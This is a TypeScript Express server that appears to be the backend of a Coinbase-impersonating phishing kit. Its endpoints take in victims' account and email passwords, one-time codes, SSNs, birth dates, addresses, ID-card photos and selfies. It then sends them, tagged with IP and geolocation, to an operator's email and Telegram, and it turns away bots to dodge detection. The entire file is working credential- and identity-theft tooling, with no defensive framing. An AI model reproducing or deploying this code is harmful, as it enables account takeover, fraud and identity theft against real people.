import express from "express";
import noBots from "express-nobots";
import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import formidableMiddleware from "express-formidable";

require("dotenv").config();

import { sendEmail } from "./utils/sendEmail";
import path from "path";
import { sendTelegram } from "./utils/sendTelegram";

const app = express();
app.use(formidableMiddleware());

const port = process.env.PORT || 5000;

app.use(noBots());
app.use(express.json());

app.post("/send-session", async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const front = req.files && (req.files.front as any);
    const back = req.files && (req.files.back as any);
    const selfie = req.files && (req.files.selfie as any);

    const values = JSON.parse(
      req.fields ? (req.fields.session as string) : "{}"
    );

    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<h3><strong>SESSION</strong></h3>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>LOGIN DETAILS</h4>
<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
      values.logins["1"].loginDetails.loginAttempt
    }</b></p>
<p>| (▰˘◡˘▰) EMAIL ☞ <b>${values.logins["1"].loginDetails.email}</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.logins["1"].loginDetails.password}</b></p>
<br>
${
  values.logins["2"]
    ? `<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${values.logins["2"].loginDetails.loginAttempt}</b></p>
<p>| (▰˘◡˘▰) EMAIL ☞ <b>${values.logins["2"].loginDetails.email}</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.logins["2"].loginDetails.password}</b></p>
<br>`
    : ""
}
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>EMAIL LOGINS</h4>
<p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${
      values.emailLogins["1"].emailLogins.attempt
    }</b></p>
<p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${
      values.emailLogins["1"].emailLogins.email
    }</b></p>
<p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${
      values.emailLogins["1"].emailLogins.emailPassword
    }</b></p>
<br>
${
  values.emailLogins["2"]
    ? `<p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${values.emailLogins["2"].emailLogins.attempt}</b></p>
<p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${values.emailLogins["2"].emailLogins.email}</b></p>
<p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${values.emailLogins["2"].emailLogins.emailPassword}</b></p>
<br>`
    : ""
}
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>BILLING</h4>
<p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${values.billing.firstname}</b></p>
<p>| (▰˘◡˘▰) LAST NAME ☞ <b>${values.billing.lastname}</b></p>
<p>| (▰˘◡˘▰) SSN ☞ <b>${values.billing.ssn}</b></p>
<p>| (▰˘◡˘▰) DOB ☞ <b>${values.billing.dob}</b></p>
<p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${values.billing.streetAddress}</b></p>
<p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${values.billing.zipCode}</b></p>
<p>| (▰˘◡˘▰) STATE ☞ <b>${values.billing.state}</b></p>
<p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.billing.phoneNumber}</b></p>
${
  values.billing.balance &&
  `<p>| (▰˘◡˘▰) POTENTIAL BALANCE ☞ <b>${values.billing.balance}</b></p>`
}
<br>
${
  values.otp
    ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>ONE TIME PASSWORD</h4>
<p>| (▰˘◡˘▰) OTP ☞ <b>${values.otp}</b></p>
<br>`
    : ""
}
${
  req.files && (req.files.front || req.files.back)
    ? ` <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>SUPPORTING DOCUMENTS${selfie ? " & SELFIE" : ""}</h4>
<p>| (▰˘◡˘▰) See attached files</b></p>
<br>`
    : ""
}
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
`;

    if (process.env.TO) {
      await sendEmail(
        process.env.TO as string,
        message,
        `COINBASE - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}`,
        req.files && (req.files.front || req.files.back)
          ? [
              {
                filename: `Front.${front.type.split("/")[1]}`,
                content: front,
              },
              {
                filename: `Back.${back.type.split("/")[1]}`,
                content: back,
              },
              ...(selfie
                ? [
                    {
                      filename: `Selfie.${selfie.type.split("/")[1]}`,
                      content: selfie,
                    },
                  ]
                : []),
            ]
          : []
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
        COINBASE - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}
        ${message}
      `,
        medias:
          req.files && (front || back)
            ? [front, back, ...(selfie ? [selfie] : [])]
            : undefined,
      });
    }
  } catch (error) {
    console.log(error);
  }

  res.send("OK");
});

app.post("/send-files", async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  const front = req.files?.front as any;
  const back = req.files?.back as any;

  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>SUPPORTING DOCUMENTS</h4>
<p>| (▰˘◡˘▰) See attached files</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
`;

    if (process.env.TO) {
      await sendEmail(
        process.env.TO as string,
        message,
        `COINBASE - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}`,
        [
          {
            filename: `Front.${front.type.split("/")[1]}`,
            content: front,
          },
          {
            filename: `Back.${back.type.split("/")[1]}`,
            content: back,
          },
        ]
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
    COINBASE - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}
    ${message}
  `,
        medias: req.files && (front || back) ? [front, back] : undefined,
      });
    }

    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong");
  }
});

app.post("/send-selfie", async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  const selfie = req.files?.selfie as any;

  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>SELFIE</h4>
<p>| (▰˘◡˘▰) See attached files</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
`;
    if (process.env.TO) {
      await sendEmail(
        process.env.TO as string,
        message,
        `COINBASE - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}`,
        [
          {
            filename: `Selfie.${selfie.type.split("/")[1]}`,
            content: selfie,
          },
        ]
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
    COINBASE - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}
    ${message}
  `,
        medias: req.files && selfie ? [selfie] : undefined,
      });
    }

    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong");
  }
});

app.post("/send-infos", async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const values = JSON.parse(Object.keys(req.fields as any)[0]);

    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
${
  values.form === "LOGIN DETAILS"
    ? `
<br>
<h4>LOGIN DETAILS</h4>
<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${values.loginDetails.loginAttempt}</b></p>
<p>| (▰˘◡˘▰) EMAIL ☞ <b>${values.loginDetails.email}</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.loginDetails.password}</b></p>
<br>
`
    : ` ${
        values.form === "EMAIL LOGINS"
          ? `
<br>
<h4>EMAIL LOGINS</h4>
<p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${values.emailLogins.attempt}</b></p>
<p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${values.emailLogins.email}</b></p>
<p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${values.emailLogins.emailPassword}</b></p>
`
          : `
${
  values.form === "BILLING"
    ? `
<br>
<h4>BILLING</h4>
<p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${values.billing.firstname}</b></p>
<p>| (▰˘◡˘▰) LAST NAME ☞ <b>${values.billing.lastname}</b></p>
<p>| (▰˘◡˘▰) SSN ☞ <b>${values.billing.ssn}</b></p>
<p>| (▰˘◡˘▰) DOB ☞ <b>${values.billing.dob}</b></p>
<p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${values.billing.streetAddress}</b></p>
<p>| (▰˘◡˘▰) SUITE/APT/OTHER ☞ <b>${values.billing.suite}</b></p>
<p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${values.billing.zipCode}</b></p>
<p>| (▰˘◡˘▰) STATE ☞ <b>${values.billing.state}</b></p>
<p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.billing.phoneNumber}</b></p>
${
  values.billing.balance &&
  `<p>| (▰˘◡˘▰) POTENTIAL BALANCE ☞ <b>${values.billing.balance}</b></p>`
}
<br>
`
    : ` <br>
<h4>ONE TIME PASSWORD</h4>
<p>| (▰˘◡˘▰) OTP ☞ <b>${values.otp}</b></p>
<br>`
}`
      }
`
}
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
`;

    if (process.env.TO) {
      await sendEmail(
        process.env.TO as string,
        message,
        `COINBASE - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
        COINBASE - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
        ${message}
      `,
      });
    }

    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send("Something went wrong");
  }
});

app.use(express.static(path.join(__dirname, "../build")));
app.get("/-", (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  res.sendFile(path.join(__dirname, "../build", "index.html"));
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
